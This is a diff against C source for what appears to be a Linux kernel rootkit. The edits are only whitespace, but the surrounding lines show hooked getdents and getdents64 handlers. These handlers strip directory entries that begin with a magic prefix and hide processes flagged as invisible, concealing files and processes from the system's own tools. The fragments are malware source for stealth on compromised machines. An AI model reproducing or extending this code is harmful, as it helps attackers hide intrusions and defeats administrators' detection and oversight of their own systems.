@@ -4,7 +4,7 @@
 #include <linux/syscalls.h>
 #include <linux/dirent.h>
 #include <linux/slab.h>
-#include <linux/version.h>
+#include <linux/version.h> 
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
 	#include <linux/proc_ns.h>
 #else
@@ -73,7 +73,7 @@ asmlinkage int
 hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,
 	unsigned int count)
 {
-	int ret = orig_getdents64(fd, dirent, count), err;
+	int ret = orig_getdents64(fd, dirent, count), err; 
 	unsigned short proc = 0;
 	unsigned long off = 0;
 	struct linux_dirent64 *dir, *kdirent, *prev = NULL;
@@ -134,7 +134,7 @@ hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent,
 	struct inode *d_inode;
 
 	if (ret <= 0)
-		return ret;
+		return ret;	
 
 	kdirent = kzalloc(ret, GFP_KERNEL);
 	if (kdirent == NULL)
@@ -156,7 +156,7 @@ hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent,
 
 	while (off < ret) {
 		dir = (void *)kdirent + off;
-		if ((!proc &&
+		if ((!proc && 
 		(memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))
 		|| (proc &&
 		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
